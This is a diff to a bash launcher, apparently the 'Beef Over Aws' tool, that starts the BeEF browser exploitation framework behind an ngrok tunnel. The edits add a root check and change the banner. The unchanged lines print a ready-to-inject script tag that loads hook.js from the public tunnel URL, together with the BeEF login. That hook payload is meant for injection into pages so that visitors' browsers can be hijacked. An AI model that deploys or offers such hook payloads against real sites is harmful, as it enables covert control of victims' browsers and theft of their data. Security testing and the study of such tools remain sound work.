@@ -1,4 +1,10 @@
 #!/bin/bash
+
+if [[ $(whoami) == "root" ]];then
+	echo -e "`tput setaf 196`[-]Please run this script without root privilages..\n\n~Beef Over Aws~"
+	exit
+fi
+
 echo "${yellow}Killing Python.."
 killall -9 python3 
 echo "${yellow}Killing Ruby.."
@@ -7,6 +13,9 @@ echo "${yellow}Killing Ngrok.."
 killall -9 ngrok 
 sleep 3
 clear
+
+
+
 url="http://localhost:4040/api/tunnels"
 port_number_default=3000
 FILE="links/username.txt"
@@ -20,10 +29,13 @@ function banner(){
 	echo -e "${yellow}   / __ )___  ___  / __/     / __ \_   _____  _____      /   | |     / / ___/"
 	echo -e "${yellow}  / __  / _ \/ _ \/ /_______/ / / / | / / _ \/ ___/_____/ /| | | /| / /\__ \ "
 	echo -e "${yellow} / /_/ /  __/  __/ __/_____/ /_/ /| |/ /  __/ /  /_____/ ___ | |/ |/ /___/ /" 
-	echo -e "${yellow}/_____/\___/\___/_/        \____/ |___/\___/_/        /_/  |_|__/|__//____/"  
-    	echo -e "${purple}	 	       #>Author:Aziz Kaplan"                                                    
-	echo -e "${purple}		       #>Github:AzizKpln"
-	echo -e "${purple}		       #>Version:1.1\n\n"
+	echo -e "${yellow}/_____/\___/\___/_/        \____/ |___/\___/_/        /_/  |_|__/|__//____/\n"  
+	echo -e "${purple}        \t\t\t\t\t\t<#Hackware Community#>\n"
+	echo -e "${purple}		         	Github:AzizKpln"
+    echo -e "${purple}	 	         	Aziz Kaplan"                                                    
+	echo -e "${purple}		         	Version:2.1\n"
+	
+	
 }
 function colors(){
 	lightblue=`tput setaf 14` 
@@ -214,7 +226,7 @@ function main(){
 		echo 'BEEF HIZLI JAVASCRIPT KODU: <script src="http://'$ngrok_url':80/hook.js"></script>' 
 		echo "BEEF KULLANICI ADI: $username"
 		echo "BEEF PAROLA: $password"
-		echo "${green}Note:Linkler ve Beef-XSS Enter'a Bastiktan Sonra Aktiflesecektir.\n\n"
+		echo -e "${green}Note:Linkler ve Beef-XSS Enter'a Bastiktan Sonra Aktiflesecektir.\n\n"
 		read -p "${yellow}Linkleri Aktif Etmek Icın Enter'a Basın.."
 		sleep 2
 		
